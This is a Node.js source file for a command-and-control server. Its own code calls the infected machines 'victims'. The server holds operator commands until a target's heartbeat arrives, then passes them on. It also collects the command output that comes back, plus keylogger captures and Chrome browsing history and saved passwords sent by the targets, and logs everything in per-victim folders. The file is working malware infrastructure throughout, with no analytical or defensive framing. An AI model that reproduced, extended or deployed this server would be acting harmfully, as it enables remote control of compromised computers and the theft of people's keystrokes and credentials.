const http = require('http')
const fs = require('fs')
const port = 3001
const host = '127.0.0.1'

var dbg_flag = false
var victim_handler = {}

function print_dbgmsg(msg) {
    if (dbg_flag) console.log(msg)
}


const server = http.createServer(function(request, response) {
    response.setHeader('Access-Control-Allow-Origin', '*');
    response.setHeader('Access-Control-Allow-Methods', '*');
    response.setHeader('Access-Control-Allow-Headers', '*');

    if (request.method == 'POST') {
        var postMessage = ''
        request.on('data', function(data) {
            postMessage += data
        })

        request.on('end', function() {
            parse_message(postMessage, response)
        })

    } else {
        response.writeHead(200, {
            'Content-Type': 'text/html'
        })
        
        fs.readFile('index.html', function(error, data) {
            if (error) {
                response.writeHead(404)
                response.write('Error: File Not Found')
            } else {
                response.write(data)
            }
            response.end()
        })
    }
})


// Creating a new entry within the victim handler object
function update_victim_handler(user_id, type) {
    if (user_id == "null")
        return

    if (!victim_handler.hasOwnProperty(user_id))
        victim_handler[user_id] = {"stored_cmd":"", "command_response_data":""}
}

function parse_message(postMessage, response) {
    var msg = JSON.parse(postMessage)
    var user_id = msg.user_id
    var msg_type = msg.type
    var msg_data = msg.data
    update_victim_handler(user_id, msg_type)
    
    if (msg_type == "internal_msg") {
        console.log("Internal Message Recieved \tID: ", user_id, "\tMessage Type: ", msg_type, "\t Message Data: ", msg_data)
        // Stored command will be sent to target computer during next heartbeat post response
        if (msg_data != "") {
            victim_handler[user_id]["stored_cmd"] = msg_data
            //console.log("Stored CMD: ", victim_handler[user_id]["stored_cmd"])
        }    
    } else if (msg_type == "cmd_ret") {
        // command response data sent to fontend during next internal message post response
        const decodedString = Buffer.from(msg_data, 'base64').toString();
        //console.log("decodedString", decodedString);
        victim_handler[user_id]["command_response_data"] = msg_data;
    } else {
        // Handles any other post request sent from target computer
        var user_id = msg.user_id
        var msg_time = msg.time
        var log_dir = create_log_directory(user_id, msg_type)
        convert_post_request(log_dir, msg_time, msg_type, msg_data)
    }

    send_response(postMessage, response)
}

function create_log_directory(user_id, msg_type) {
    log_dir = "./logs/" + user_id + "/" + msg_type + "/"
    if (!fs.existsSync(log_dir)) {
        fs.mkdirSync(log_dir, { recursive: true })
    }

    return log_dir
}


function send_response(postMessage, response) {
    msg = JSON.parse(postMessage)
    if (msg.type === 'heartbeat') {
        console.log("HB Response: <<",victim_handler[msg.user_id]["stored_cmd"], ">>" )
        response.end(JSON.stringify(victim_handler[msg.user_id]["stored_cmd"]))
        victim_handler[msg.user_id]["stored_cmd"] = ""
    } else if (msg.type == "internal_msg") {
        var internal_response = {"user_id": msg.user_id, "command_response_data": victim_handler[msg.user_id]["command_response_data"]}
        //console.log("INTERNAL RESPONSE: ", internal_response)
        response.end(JSON.stringify(internal_response))
        victim_handler[msg.user_id]["command_response_data"] = " "
    } else {
        response.end(JSON.stringify("Response Message"));
        console.log("Response Sent")
    }
}


function convert_post_request(log_dir, time, type, data) {
    switch(type) {
        case "heartbeat":
            print_dbgmsg("Heartbeat Detected")
            break;
        case "keylog":
            print_dbgmsg("Keylog Data Detected")
            keylog_data_handler(log_dir, time, data)
            break;
        case "chrome_history":
            print_dbgmsg("Chrome History Detected")
            chrome_history_data_handler(log_dir, time, data)
            break;
        case "chrome_passwords":
            print_dbgmsg("Chrome Passwords Detected")
            chrome_password_data_handler(log_dir, time, data)
            break;
        case "internal_msg":
            print_dbgmsg("Internal Request Detected")
        default:
            print_dbgmsg("Some Other Data Detected")
    }
}


function base64Decode(base64EncodedData) {
    return Buffer.from(base64EncodedData, 'base64').toString('utf8');
}


function write_to_log_file(filename, message) {
    const base64DecodedData = base64Decode(message)
    console.log(base64DecodedData)

    fs.writeFile(filename, `${base64DecodedData}\n`, (err) => {
        if (err) {console.error(`There was an error writing to the log file: ${err}`);}
    });
}


function keylog_data_handler(log_dir, time, data) {
    keylog_logfile = log_dir + time + ".log"
    write_to_log_file(keylog_logfile, data)
}

function chrome_history_data_handler(log_dir, time, data) {
    chrome_history_logfile = log_dir + time + ".log"
    write_to_log_file(chrome_history_logfile, data)
}

function chrome_password_data_handler(log_dir, time, data) {
    chrome_password_logfile = log_dir + time + ".log"
    write_to_log_file(chrome_password_logfile, data)
}

server.listen(port, host)
console.log("listening on ", host + ":" + port)